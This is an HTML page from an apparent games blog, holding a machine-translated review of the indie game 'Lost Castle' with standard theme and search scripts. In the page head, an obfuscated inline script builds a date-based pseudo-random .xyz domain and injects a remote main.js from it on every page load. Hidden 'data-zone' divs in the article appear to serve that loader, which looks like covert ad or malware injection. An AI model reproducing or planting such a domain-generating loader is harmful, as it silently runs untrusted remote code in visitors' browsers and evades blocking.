<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="Three years ago, an independent game named “Lost Castle” appeared in steam mall, and soon attracted the attention of many players. This is a 2D cartoon style horizontal action game with rougelite (rou">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="Three years ago, an independent game named “Lost Castle” appeared in steam mall, and soon attracted the attention of many players. This is a 2D cartoon style horizontal action game with rougelite (rou">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/d17824f4bbc3441bb2a048714eefffc1.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/768d88ea28264bd5878ec6ffc15b7b63.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/a98a56c5cbf849278c22129f64ae8973.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/ff41e2e7b0d54e22beb4d77e948873bf.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/2774c2f59f4f40bb80e50f1b0921fe30.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/461c350be45f43e9804027f1f47fbb3e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/eb5d734507394630b8d06df9679c2b1e.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:50.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle">
<meta name="twitter:description" content="Three years ago, an independent game named “Lost Castle” appeared in steam mall, and soon attracted the attention of many players. This is a 2D cartoon style horizontal action game with rougelite (rou">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/d17824f4bbc3441bb2a048714eefffc1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Three years ago, an independent game named “Lost Castle” appeared in steam mall, and soon attracted the attention of many players. This is a 2D cartoon style horizontal action game with rougelite (rougelite is different from rougelike) elements. With rich game content and highly playable rougelite playing method, it is also a small fire in the independent game circle. Several friends of the author were quite addicted to this game at that time, playing several online every night.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/d17824f4bbc3441bb2a048714eefffc1.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>Lost Castle has sold more than one million copies since it was released. It has won “special praise” on steam platform. It has sold 400000 sets in one year. This achievement is not very high, but it is also very good. The most unexpected thing is that the game is actually developed by Chinese people, so the game has also become one of the first pioneers of domestic independent games, even earlier than the popular domestic work “icey”. Now “Lost Castle” has achieved a million sales worldwide, which has been a very outstanding achievement for an independent studio. After three years, they finally put the game on the mobile platform, trying to set off another wave of hot sales.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/768d88ea28264bd5878ec6ffc15b7b63.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>The total evaluation is over 10000, and the favorable rate is 90%</p>
<h1 id="“hard-core”"><a href="#“hard-core”" class="headerlink" title="“hard core”"></a>“hard core”</h1><p>Looking at the name “Lost Castle” alone, you can obviously feel a very conventional atmosphere, but this feeling is not so annoying. It’s like a fairy tale that everyone knows. Seeing the name, you can probably guess what kind of story the game wants to tell. In a simple way, there is a castle in a remote area. There is an earl in the castle who contacts the black magic because of his own death, so he is eroded and degenerated by the dark forces, and opens the transmission door to the demon world. The whole castle is controlled by the demons, and the player’s role is a treasure hunter who wants to take advantage of the chaos and get something from the castle. So the story of the game begins 。 The core play method of the game is the same as the previous RPG of the underground city. It is also one room after another to explore, and all enemies in the room need to be removed before going to the next room. Due to the addition of rougelite element, death has become the most common thing in the game. Players will get different weapons and explore different maps every time they are reborn Highlight the importance of this element, and the difficulty of the game is not easy.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/a98a56c5cbf849278c22129f64ae8973.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>The producer of Lost Castle is he bin. He has taught himself game design since high school. He always wanted to provide help for game design when he was transferred to university. He Bin’s favorite games are often some works of great difficulty and depth, such as “black soul”, “blood source” under Miyazaki Ying master, and “Monster Hunter” series produced by kapukong, etc., which are famous “hard core” action games. They have master level control over their own game, whether it’s battle rhythm or system design, so These works are often imitated by developers, especially independent developers. But he bin, as an independent gamer, also likes all kinds of independent game masterpieces, such as famine and the combination of Isaac, which provide him with many design ideas. He Bin co founded Hunter studios with two friends he met while learning game design, because they all like monster hunter and blood source very much, so it’s really some of the second breath.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/ff41e2e7b0d54e22beb4d77e948873bf.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>Three founders of the studio, he bin in the middle</p>
<h1 id="against-the-current"><a href="#against-the-current" class="headerlink" title="against the current"></a>against the current</h1><p>He Bin wanted to make a horizontal action game with a hard core style when he first set up the project for the game. After all, his ability is not so outstanding. He has tried his best to make a 2D horizontal action game, and he can only flinch from liking 3D action games. At the same time, because of his love for rougelite game, he bin decided to combine the horizontal movement with rougelite, so that the difficulty setting he wanted had a standard, and the content and gameplay of the game could be determined. The reason why we insist on creating a horizontal action game is also related to the current mobile game environment to a large extent. Most of the domestic games start to seize the market after seeing the gold absorption ability of the mobile game. If there is a popular product, it will become the target for everyone to follow, and there will be a bunch of skin games changing soup or medicine on the market, with independent essence God is naturally cynical about this phenomenon. To some extent, “Lost Castle” was born at this opportunity.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/2774c2f59f4f40bb80e50f1b0921fe30.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>At first, it could be touched by a few monsters, and it’s dying<br>The hard core of Lost Castle is reflected in the slow and stiff action of the characters, not too strong in action, and the high damage of the little monsters. In most cases, they can only dodge the enemy’s attack by walking. Because of the use of the eight direction two-dimensional movement mode and the small range of attack judgment, attacks often occur in the air. Strictly speaking, the overall design tends to the early years The horizontal version of action arcade game, but if compared with the arcade, there is still a lot of sense of impact and screen impact. In the aspect of fighting, different from the general horizontal arcade game is that the protagonist can try different attack modes by changing different kinds of weapons, such as large sword range, high damage, slow attack speed, easy to hit the enemy and easy to be hit at the same time, while different types of similar weapons also have different special effects. In short, this setting is similar to “Monster Hunter”. Each weapon is a different way of fighting, while “Lost Castle” puts the process of weapon selection directly into the game process, rather than fixing it for players before fighting.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/461c350be45f43e9804027f1f47fbb3e.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>There are many weapon styles<br>Players familiar with “Monster Hunter” should know that the greatest pleasure of this game is to challenge all kinds of Monsters online with their friends. Therefore, “Lost Castle” also adds a multi person online system similar to the arcade game in the early years, to take risks with their friends. In multiplayer mode, the number of monsters will increase significantly. The items dropped from fighting monsters also need to compete with friends. In addition to the intense stimulation of cooperation in fighting, it’s also fun to throw one item at another to kill each other. From an objective point of view, the design idea of this game is very excellent, and the performance in the actual experience is not too big except for a little bit difficult, while the game itself has a relatively obscure disadvantage, which is the lack of consistency. Some parts of the game are made very well, while some parts are rough, such as the artistic design of characters and scenes Although it belongs to the medium level, it seems very rigid in animation performance. The design of dialogue, characters and props is slightly out of tune with the overall style of the game, which not only affects the overall view, but also may affect the game experience.<br><img src="http://maiygu.xyz/2019/11/08/Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle/eb5d734507394630b8d06df9679c2b1e.jpg" alt="Three years ago, the home-made blockbuster game came back again. What kind of game is lost castle"><br>The rendering of scene objects is not compatible with the whole scene<br>    concluding remarks<br>Lost Castle, as a work developed by a fledgling studio, has a good performance as a whole. What’s more, for a Chinese game studio, although it is not so excellent, at least it can make Chinese players praise more than belittle when discussing the game to a greater extent. Logging in to the mobile platform is undoubtedly an opportunity for the game to be re exposed to people’s vision. Maybe some people will buy a try, and some people will not choose to buy it. For a game that can start a game at any time, maybe logging in to the mobile platform is a good choice. This feeling is like playing Monster Hunter online in PSP in the early years It’s just a different era.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/The second spring of classic FPS/" rel="next" title="The second spring of classic FPS">
                <i class="fa fa-chevron-left"></i> The second spring of classic FPS
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/The trump card of being shut down, the rise and fall of visceral games, the developer of dead space/" rel="prev" title="The trump card of being shut down, the rise and fall of visceral games, the developer of dead space">
                The trump card of being shut down, the rise and fall of visceral games, the developer of dead space <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#“hard-core”"><span class="nav-number">1.</span> <span class="nav-text">“hard core”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#against-the-current"><span class="nav-number">2.</span> <span class="nav-text">against the current</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
